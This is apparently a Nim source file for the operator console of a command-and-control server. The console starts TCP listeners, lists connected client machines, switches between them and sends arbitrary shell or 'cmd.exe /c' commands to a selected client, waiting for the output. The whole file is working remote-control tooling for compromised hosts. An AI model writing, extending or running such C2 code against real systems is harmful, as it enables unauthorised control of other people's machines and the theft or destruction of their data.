import asyncdispatch, asyncnet, threadpool, asyncfutures
import strutils, terminal

import listeners/[tcp]

import types, logging

proc procStdin*(server: C2Server) {.async.} =
  var handlingClient: C2Client

  prompt(handlingClient, server)
  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      let input = ^messageFlowVar
      let args = input.split(" ")
      let argsn = len(args)
      let cmd = args[0]

      case cmd:
        of "help":
            echo "-- Navigation"
            echo "\texit\twhy would you ever exit?"
            echo "\tback\tgo back to main menu"
            echo "\tswitch [id]\tswitch to a client"
            echo "-- Listeners"
            echo "\tstartlistener [type] [..args]\tstart a listener"
            echo "\tlisteners\tshow a list of listeners"
            echo "\tclientlisteners\tshow a list of listeners and their clients"
            echo "-- Managing clients"
            echo "\tclients\tview a list of clients"
            echo "\tinfo\tget info about a client"
            echo "\tshell\trun a shell command"
            echo "\tcmd\trun a cmd command ('cmd.exe /c')"
        of "listeners":
            for tcpListener in server.tcpListeners:
                infoLog @tcpListener
            infoLog $len(server.tcpListeners) & " listeners"
        of "clientlisteners":
            for tcpListener in server.tcpListeners:
                infoLog @tcpListener
                for client in server.clients:
                    if client.listenerType == "tcp" and client.listenerId == tcpListener.id:
                        infoLog "\t<- " & $client
            infoLog $len(server.tcpListeners) & " listeners"
        of "startlistener":
            if argsn >= 2:
                if args[1] == "TCP":
                    if argsn >= 4:
                        asyncCheck server.createNewTcpListener(parseInt(args[3]), args[2])
                    else:
                        echo "Bad usage, correct usage: startlistener TCP (ip) (port)"
            else:
                echo "You need to specify the type of listener you wanna start, supported: TCP"
        of "clients":
            for client in server.clients:
                if client.connected:
                    stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
                else:
                    stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
            infoLog $len(server.clients) & " clients currently connected"
        of "switch":
            for client in server.clients:
                if client.id == parseInt(args[1]):
                    handlingClient = client
            if handlingClient.isNil() or handlingClient.id != parseInt(args[1]):
                infoLog "client not found"
        of "info":
            echo @handlingClient
        of "shell":
            if handlingClient.listenerType == "tcp":
                let tcpSocket: TCPSocket = getTcpSocket(handlingClient)
                if tcpSocket.isNil():
                    errorLog "Could not find TCP Socket for " & $handlingClient
                else:
                    await tcpSocket.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
                    if server.clRespFuture[].isNil():
                        server.clRespFuture[] = newFuture[void]()
                    await server.clRespFuture[]
        of "cmd":
            if handlingClient.listenerType == "tcp":
                let tcpSocket: TCPSocket = getTcpSocket(handlingClient)
                if tcpSocket.isNil():
                    errorLog "Could not find TCP Socket for " & $handlingClient
                else:
                    await tcpSocket.socket.send("CMD:cmd.exe /c " & args[1..(argsn - 1)].join(" ") & "\r\n")
                    if server.clRespFuture[].isNil():
                        server.clRespFuture[] = newFuture[void]()
                    await server.clRespFuture[]
        of "back": 
            handlingClient = nil
        of "exit":
            quit(0)

      prompt(handlingClient, server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)
